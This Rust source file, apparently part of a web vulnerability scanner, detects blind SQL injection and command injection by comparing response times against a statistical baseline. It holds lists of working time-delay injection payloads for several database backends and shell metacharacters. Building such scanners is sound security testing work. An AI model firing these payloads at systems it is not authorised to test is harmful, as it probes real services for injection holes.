//! Timing-based detection for blind SQLi / RCE / command injection.
//! Statistical: 5+ samples, mean + stdev differential vs baseline.

use std::time::Duration;

/// SLEEP payloads per backend. Each is a no-op that takes `seconds`.
pub const SQL_SLEEP: &[&str] = &[
    "' OR SLEEP({s})--",
    "1' OR SLEEP({s})#",
    "' WAITFOR DELAY '0:0:{s}'--",
    "'; WAITFOR DELAY '0:0:{s}'--",
    "1; SELECT pg_sleep({s})--",
    "'; SELECT pg_sleep({s})--",
    "'; DBMS_LOCK.SLEEP({s})--",
];

pub const CMD_SLEEP: &[&str] = &[
    "& sleep {s}",
    "; sleep {s}",
    "| sleep {s}",
    "$(sleep {s})",
    "`sleep {s}`",
];

/// Build payload variants with seconds baked in.
pub fn sql_sleep_payloads(seconds: u64) -> Vec<String> {
    SQL_SLEEP.iter().map(|p| p.replace("{s}", &seconds.to_string())).collect()
}

pub fn cmd_sleep_payloads(seconds: u64) -> Vec<String> {
    CMD_SLEEP.iter().map(|p| p.replace("{s}", &seconds.to_string())).collect()
}

/// Sample mean from durations. Returns 0 if empty.
pub fn mean(samples: &[Duration]) -> Duration {
    if samples.is_empty() {
        return Duration::ZERO;
    }
    let total: Duration = samples.iter().sum();
    total / samples.len() as u32
}

/// Sample standard deviation.
pub fn stdev(samples: &[Duration], mean_d: Duration) -> Duration {
    if samples.len() < 2 {
        return Duration::ZERO;
    }
    let var: f64 = samples.iter().map(|d| {
        let diff = d.as_secs_f64() - mean_d.as_secs_f64();
        diff * diff
    }).sum::<f64>() / (samples.len() as f64 - 1.0);
    Duration::from_secs_f64(var.sqrt())
}

/// Heuristic: response is "delayed" if mean > baseline.mean + baseline.stdev * 3 + threshold.
pub fn is_delayed(baseline: &[Duration], response: &[Duration], threshold_ms: u64) -> bool {
    let bm = mean(baseline);
    let bs = stdev(baseline, bm);
    let rm = mean(response);
    let cutoff = bm + bs * 3 + Duration::from_millis(threshold_ms);
    rm > cutoff
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn sql_payload_count() {
        assert_eq!(sql_sleep_payloads(5).len(), SQL_SLEEP.len());
    }
    #[test]
    fn delay_detection_positive() {
        let baseline = vec![
            Duration::from_millis(50),
            Duration::from_millis(55),
            Duration::from_millis(48),
        ];
        let response = vec![Duration::from_millis(2000), Duration::from_millis(2100)];
        assert!(is_delayed(&baseline, &response, 500));
    }
    #[test]
    fn delay_detection_negative() {
        let baseline = vec![
            Duration::from_millis(50),
            Duration::from_millis(55),
            Duration::from_millis(48),
        ];
        let response = vec![Duration::from_millis(60), Duration::from_millis(58)];
        assert!(!is_delayed(&baseline, &response, 500));
    }
    #[test]
    fn stdev_zero_one_sample() {
        let s = vec![Duration::from_millis(100)];
        let m = mean(&s);
        assert_eq!(stdev(&s, m), Duration::ZERO);
    }
}
